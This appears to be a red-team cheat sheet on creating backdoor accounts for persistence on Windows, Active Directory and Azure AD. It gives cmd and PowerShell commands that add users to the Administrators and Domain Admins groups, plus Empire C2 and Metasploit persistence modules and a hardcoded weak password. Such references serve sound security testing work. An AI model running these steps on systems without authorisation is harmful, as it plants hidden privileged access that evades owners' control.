# Account Creation

## Permissions: Administrator | SYSTEM

### 1) Local Account

#### Cmd

##### Create new user

    net user /add "<Username>" "<Password>"

##### Add to RDP Group

    net localgroup "Remote Desktop Users" "<Username>" /add

##### Add to local administrators

    net localgroup administrators "<Username>" /add

#### Powershell

##### Create new user 

    New-LocalUser -Name "<Username>" -NoPassword

##### Add to RDP Group

    Add-LocalGroupMember -Group "Remote Desktop Users" -Member "<Username>"

##### Add to local administrators

    Add-LocalGroupMember -Group "Administrators" -Member "<Username>"

### 2) Domain Account

#### Cmd

##### Create Domain User

    net user "<Username>" "<Password>" /add /domain

##### Add to Domain Admins Group

    net group "Domain Admins" "<Username>" /add /domain

#### Powershell

    $Name = "<Username>"
    $Domain = "<Domain>"
    $Password = "Password123"
    $SecurePass = ConvertTo-SecureString -String $Password -AsPlainText -Force
    $NewUser = New-ADUser `
        -Name "$Name"`
        -SamAccountName "$Name"`
        -UserPrincipalName "$Name@$Domain"`
        -AccountPassword $SecurePass;  
    Enable-ADAccount -Identity "$Name";
    Add-ADGroupMember -Identity "Domain Admins" -Members "$Name"

#### Empire C2

    usemodule/powershell/persistence/misc/add_netuser

##### Local account

    set Domain ''
    set UserName <Username>
    execute

##### Domain Account

    set Domain <Domain>
    set UserName <Username>
    execute

#### Metasploit

    use post/windows/manage/add_user 

### 3) Cloud Accounts

#### Azure Powershell

##### Create Azure user

    $PasswordProfile = New-Object -TypeName Microsoft.Open.AzureAD.Model.PasswordProfile
    $PasswordProfile.Password = "<Password>"

    New-AzureADUser `
        -DisplayName "New User" ` 
        -PasswordProfile $PasswordProfile `
        -UserPrincipalName "NewUser@contoso.com" `
        -AccountEnabled $true `
        -MailNickName "Newuser"

##### Add user to Azure Group

    Add-AzureADGroupMember -ObjectId "<ObjectID" -RefObjectId "<RefObject>"
